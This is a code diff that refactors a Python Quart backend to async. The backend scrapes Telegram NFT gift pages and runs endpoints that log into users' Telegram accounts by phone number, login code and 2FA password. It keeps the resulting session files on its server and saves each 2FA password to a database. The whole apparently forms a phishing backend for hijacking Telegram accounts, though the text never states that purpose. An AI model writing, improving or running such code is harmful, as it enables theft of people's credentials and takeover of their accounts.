@@ -1,10 +1,11 @@
 from flask_cors import CORS
-import sqlite3
-import requests
+import aiosqlite
+import aiohttp
+import asyncio
 import os
 from bs4 import BeautifulSoup
 from telethon import TelegramClient
-from telethon.errors import SessionPasswordNeededError
+from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
 from db_func import *
 from quart import Quart, request, jsonify
 
@@ -20,7 +21,6 @@ os.makedirs(SESSION_DIR, exist_ok=True)
 
 def get_client_for_user(user_id: int):
     session_file = os.path.join(SESSION_DIR, f"{user_id}.session")
-
     return TelegramClient(session_file, api_id, api_hash)
 
 
@@ -55,21 +55,20 @@ def add_cors_headers(response):
     return response
 
 
-
-
-
-def parse_telegram_nft(collection, gift_id):
+async def parse_telegram_nft(collection, gift_id):
     url = f"https://t.me/nft/{collection}-{gift_id}"
 
     try:
-        r = requests.get(url, timeout=10)
+        async with aiohttp.ClientSession() as session:
+            async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as r:
+                if r.status != 200:
+                    return {"error": f"Tg returned status {r.status}"}
+                
+                html = await r.text()
     except Exception as e:
         return {"error": f"Request failed: {e}"}
 
-    if r.status_code != 200:
-        return {"error": f"Tg returned status {r.status_code}"}
-
-    soup = BeautifulSoup(r.text, "html.parser")
+    soup = BeautifulSoup(html, "html.parser")
 
     # --- Parse NFT name ---
     name = None
@@ -101,16 +100,13 @@ def parse_telegram_nft(collection, gift_id):
     }
 
 
-    
-
-
 @app.route("/api/nft")
-def api_nft():
-    row = get_random_row()
+async def api_nft():
+    row = await get_random_row()
     if not row:
         return jsonify({"error": "No rows"}), 404
 
-    tg = parse_telegram_nft(row["collection"], row["gift_id"])
+    tg = await parse_telegram_nft(row["collection"], row["gift_id"])
 
     # create flat JSON
     response = {
@@ -134,7 +130,7 @@ async def api_phone():
     if not user_id:
         return jsonify({"ok": False, "error": "missing user_id"}), 400
 
-    phone = get_num_from_id(user_id)
+    phone = await get_num_from_id(user_id)
     if not phone:
         return jsonify({"ok": False, "error": "phone not found"}), 404
     print("trying1")
@@ -147,6 +143,8 @@ async def api_phone():
     except Exception as e:
         print(e)
         return jsonify({"ok": False, "error": str(e)}), 400
+    finally:
+        await client.disconnect()
 
 
 @app.route("/api/send_code", methods=["POST", "OPTIONS"])
@@ -160,10 +158,10 @@ async def api_code():
     if not user_id or not code:
         return jsonify({"ok": False, "error": "missing user_id or code"}), 400
 
+    client = get_client_for_user(user_id)
     try:
-        client = get_client_for_user(user_id)
         await client.connect()
-        phone = get_num_from_id(user_id)    
+        phone = await get_num_from_id(user_id)    
 
         try:
             await client.sign_in(phone, code)
@@ -175,6 +173,8 @@ async def api_code():
             return jsonify({"ok": False, "error": "invalid code"})
     except Exception as e:
         return jsonify({"ok": False, "error": str(e)}), 400
+    finally:
+        await client.disconnect()
 
 
 @app.route("/api/2fa", methods=["POST"])
@@ -186,16 +186,16 @@ async def api_2fa():
     if not user_id or not password:
         return jsonify({"ok": False, "error": "missing user_id or password"}), 400
     
-
+    client = get_client_for_user(user_id)
     try:
-        client = get_client_for_user(user_id)
         await client.connect()
         await client.sign_in(password=password)
-        put_2fa_in_user(user_id,password)
+        await put_2fa_in_user(user_id, password)
         return jsonify({"ok": True})
     except Exception as e:
         return jsonify({"ok": False, "error": str(e)}), 400
-
+    finally:
+        await client.disconnect()
 
 
 if __name__ == "__main__":
